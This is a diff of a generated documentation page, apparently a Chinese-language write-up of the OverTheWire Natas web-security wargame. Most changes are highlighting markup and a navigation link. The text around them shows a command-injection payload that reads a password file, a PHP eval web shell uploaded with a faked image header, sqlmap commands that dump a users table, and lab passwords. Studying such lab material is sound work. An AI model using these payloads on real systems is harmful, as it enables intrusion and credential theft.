@@ -2179,6 +2179,20 @@
 
             
           
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/tetctftoken/" class="md-nav__link">
+        TetCTFToken
+      </a>
+    </li>
+  
+
+            
+          
         </ul>
       </nav>
     </li>
@@ -3082,8 +3096,8 @@ mallory:9urtcpzBmH
 <li>
 <p>访问 <a href="http://natas3.natas.labs.overthewire.org/robots.txt">http://natas3.natas.labs.overthewire.org/robots.txt</a> ，查看 <em>robots.txt</em> 文件
   <div class="highlight"><pre><span></span><code><span class="c1"># 禁止所有爬虫爬取路径 /s3cr3t</span>
-User-agent: *
-Disallow: /s3cr3t/
+User-agent:<span class="w"> </span>*
+Disallow:<span class="w"> </span>/s3cr3t/
 </code></pre></div></p>
 </li>
 <li>目标指向 <a href="http://natas3.natas.labs.overthewire.org/s3cr3t/">http://natas3.natas.labs.overthewire.org/s3cr3t/</a> ，访问可查看到该路径下的一个 <em>users.txt</em> 文件，其中包含下一关的口令
@@ -3312,7 +3326,7 @@ Input secret: <span class="p">&lt;</span><span class="nt">input</span> <span cla
 <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div></li>
 <li>对<code>$encodedSecret</code>进行逆操作，以得到要提交的<code>secret</code>的值
-  <div class="highlight"><pre><span></span><code>$ <span class="nb">echo</span> 0x3d3d516343746d4d6d6c315669563362 <span class="p">|</span> xxd -r <span class="p">|</span> rev <span class="p">|</span> base64 -d
+  <div class="highlight"><pre><span></span><code>$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>0x3d3d516343746d4d6d6c315669563362<span class="w"> </span><span class="p">|</span><span class="w"> </span>xxd<span class="w"> </span>-r<span class="w"> </span><span class="p">|</span><span class="w"> </span>rev<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
 oubWYf2kBq
 </code></pre></div></li>
 <li>提交即可获取口令<br>
@@ -3377,7 +3391,7 @@ Output:
 <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div></li>
 <li>输入没有经过任何处理直接放到命令字符串里了！这样一来，可就不能只执行一个命令了哦~👿提交<code>;cat /etc/natas_webpass/natas10 #</code>，拼接后的命令如下
-  <div class="highlight"><pre><span></span><code>grep -i <span class="p">;</span>cat /etc/natas_webpass/natas10 <span class="c1"># dictionary.txt</span>
+  <div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-i<span class="w"> </span><span class="p">;</span>cat<span class="w"> </span>/etc/natas_webpass/natas10<span class="w"> </span><span class="c1"># dictionary.txt</span>
 </code></pre></div></li>
 <li>成功获得下一关的口令<br>
 <img alt="nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu" src="../img/natas18.jpg" /></li>
@@ -3578,14 +3592,14 @@ Background color: <span class="p">&lt;</span><span class="nt">input</span> <span
 <span class="p">}</span>
 
 <span class="k">echo</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">));</span>
-<span class="cp">?&gt;</span><span class="x"></span>
+<span class="cp">?&gt;</span>
 </code></pre></div></li>
 <li>循环节长度为 4，轻松获得<code>$key</code>值：<em>qw8J</em>
-  <div class="highlight"><pre><span></span><code>$ php -f calc.php
+  <div class="highlight"><pre><span></span><code>$<span class="w"> </span>php<span class="w"> </span>-f<span class="w"> </span>calc.php
 qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
 </code></pre></div></li>
 <li>接下来获取目标 <em>Cookie</em>
-  <div class="highlight"><pre><span></span><code>$ php -f calc.php
+  <div class="highlight"><pre><span></span><code>$<span class="w"> </span>php<span class="w"> </span>-f<span class="w"> </span>calc.php
 ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
 </code></pre></div>
   <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
@@ -3603,7 +3617,7 @@ ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
 <span class="p">}</span>
 
 <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$targetdata</span><span class="p">)));</span>
-<span class="cp">?&gt;</span><span class="x"></span>
+<span class="cp">?&gt;</span>
 </code></pre></div></li>
 <li>编辑原 HTTP 请求头中的 <em>Cookie</em> 的值，并再次发送，成功获取下一关口令<br>
 <img alt="EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3" src="../img/natas23.jpg" /></li>
@@ -3700,7 +3714,7 @@ Choose a JPEG to upload (max 1KB):<span class="p">&lt;</span><span class="nt">br
 <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div></li>
 <li>创建并编辑文件<code>hack.php</code>
-  <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x"></span>
+  <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
 </code></pre></div></li>
 <li>修改前端表单，将文件后缀<code>jpg</code>改为<code>php</code>，并上传文件<code>hack.php</code><br>
 <img alt="修改 input 标签的值" src="../img/natas25.jpg" /></li>
@@ -3812,7 +3826,7 @@ Choose a JPEG to upload (max 1KB):<span class="p">&lt;</span><span class="nt">br
 </code></pre></div></li>
 <li>在<code>hack.php</code>中添加任意图片文件文件头即可绕过<code>exif_imagetype</code>检查
   <div class="highlight"><pre><span></span><code><span class="x">BM</span>
-<span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x"></span>
+<span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
 </code></pre></div></li>
 <li>接下来，修改前端文件后缀名、上传文件、使用菜刀的步骤、方法与 <a href="#level-12">Level 12</a> 一致<br>
 <img alt="Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1" src="../img/natas30.jpg" /></li>
@@ -3999,26 +4013,26 @@ Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="
 </code></pre></div></li>
 <li>也可以使用<code>sqlmap</code>
   <div class="highlight"><pre><span></span><code><span class="c1"># 枚举数据库</span>
-$ sqlmap -u http://natas15.natas.labs.overthewire.org/index.php --auth-type<span class="o">=</span>basic --auth-cred<span class="o">=</span>natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data<span class="o">=</span><span class="nv">username</span><span class="o">=</span>natas16 --dbms<span class="o">=</span>mysql --level<span class="o">=</span><span class="m">5</span> --dbs
+$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://natas15.natas.labs.overthewire.org/index.php<span class="w"> </span>--auth-type<span class="o">=</span>basic<span class="w"> </span>--auth-cred<span class="o">=</span>natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<span class="w"> </span>--data<span class="o">=</span><span class="nv">username</span><span class="o">=</span>natas16<span class="w"> </span>--dbms<span class="o">=</span>mysql<span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--dbs
 ...
-available databases <span class="o">[</span><span class="m">2</span><span class="o">]</span>:
-<span class="o">[</span>*<span class="o">]</span> information_schema
-<span class="o">[</span>*<span class="o">]</span> natas15
+available<span class="w"> </span>databases<span class="w"> </span><span class="o">[</span><span class="m">2</span><span class="o">]</span>:
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>information_schema
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>natas15
 ...
 
 <span class="c1"># 表名已知，直接获取 users 表</span>
-$ sqlmap -u http://natas15.natas.labs.overthewire.org/index.php --auth-type<span class="o">=</span>basic --auth-cred<span class="o">=</span>natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data<span class="o">=</span><span class="nv">username</span><span class="o">=</span>natas16 --dbms<span class="o">=</span>mysql --level<span class="o">=</span><span class="m">5</span> -D natas15 -T users --dump
+$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span>http://natas15.natas.labs.overthewire.org/index.php<span class="w"> </span>--auth-type<span class="o">=</span>basic<span class="w"> </span>--auth-cred<span class="o">=</span>natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<span class="w"> </span>--data<span class="o">=</span><span class="nv">username</span><span class="o">=</span>natas16<span class="w"> </span>--dbms<span class="o">=</span>mysql<span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>-D<span class="w"> </span>natas15<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump
 ...
-Database: natas15
-Table: users
-<span class="o">[</span><span class="m">4</span> entries<span class="o">]</span>
+Database:<span class="w"> </span>natas15
+Table:<span class="w"> </span>users
+<span class="o">[</span><span class="m">4</span><span class="w"> </span>entries<span class="o">]</span>
 +----------+----------------------------------+
-<span class="p">|</span> username <span class="p">|</span> password                         <span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>username<span class="w"> </span><span class="p">|</span><span class="w"> </span>password<span class="w">                         </span><span class="p">|</span>
 +----------+----------------------------------+
-<span class="p">|</span> bob      <span class="p">|</span> 6P151OntQe                       <span class="p">|</span>
-<span class="p">|</span> charlie  <span class="p">|</span> HLwuGKts2w                       <span class="p">|</span>
-<span class="p">|</span> alice    <span class="p">|</span> hROtsfM734                       <span class="p">|</span>
-<span class="p">|</span> natas16  <span class="p">|</span> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh <span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>bob<span class="w">      </span><span class="p">|</span><span class="w"> </span>6P151OntQe<span class="w">                       </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>charlie<span class="w">  </span><span class="p">|</span><span class="w"> </span>HLwuGKts2w<span class="w">                       </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>alice<span class="w">    </span><span class="p">|</span><span class="w"> </span>hROtsfM734<span class="w">                       </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>natas16<span class="w">  </span><span class="p">|</span><span class="w"> </span>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh<span class="w"> </span><span class="p">|</span>
 +----------+----------------------------------+
 ...
 </code></pre></div></li>
@@ -4487,7 +4501,7 @@ Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="
     <nav class="md-footer__inner md-grid" aria-label="页脚" >
       
         
-        <a href="../../blockchain/cookie_market/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Cookie Market" rel="prev">
+        <a href="../../blockchain/tetctftoken/" class="md-footer__link md-footer__link--prev" aria-label="上一页: TetCTFToken" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
           </div>
@@ -4496,7 +4510,7 @@ Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="
               <span class="md-footer__direction">
                 上一页
               </span>
-              Cookie Market
+              TetCTFToken
             </div>
           </div>
         </a>
